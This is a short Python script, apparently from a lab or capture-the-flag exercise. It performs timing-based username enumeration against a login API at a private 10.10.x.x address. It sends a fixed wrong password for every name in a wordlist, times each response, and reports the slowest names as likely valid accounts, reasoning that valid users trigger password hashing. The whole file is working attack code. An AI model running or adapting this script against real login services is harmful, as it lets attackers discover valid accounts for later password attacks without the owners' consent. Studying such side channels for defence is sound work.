#!/usr/bin/env python3
import requests
import sys
import time

url = "http://10.10.248.119:8080/api/user/login"
password = "invalidPassword!"

timings = {}
no_of_req = 0

def logIn(username,password):
	global no_of_req
	req = requests.post(url,json={
		"username":username,
		"password":password,
		"submit": "Login",
		})
	#print("done")
	#print(req)
	if(req.status_code != 200):  # This means there was an API error
		print("Error:", req.status_code)
	print(f"No. of requests: {no_of_req}")
	no_of_req+=1
	return req

#print(sys.argv[1])
with open(sys.argv[1],'r') as f:
	usernames = [line.strip() for line in f.read().split("\n") ]

print("Starting POST Requests")

for username in usernames:
	# Do a request for every user in the list, and time how long it takes
	startTime = time.time()
	logIn(username,password)
	endTime = time.time()
	# record the time for this user along with the username
	timings[username] = endTime - startTime
	# Wait to avoid DoSing the server which causes unreliable results
	time.sleep(0.01)

print("Finished POST requests")
# Longer times normally mean valid usernames as passwords were verified
largestTime = max(timings.values())
smallestTime = min(timings.values())
# Ideally the smallest times should be near instant, and largest should be 1+ seconds
print("Time delta:", largestTime-smallestTime, "seconds (larger is better)")

# A valid username means the server will hash the password
# As this takes time, the longer requests are likely to be valid users
# The longer the request took, the more likely the request is to be valid.

for user, time in timings.items():
	if time >= largestTime * 0.9:
		# with 10% time tolerence
		print(user, "is likely to be valid")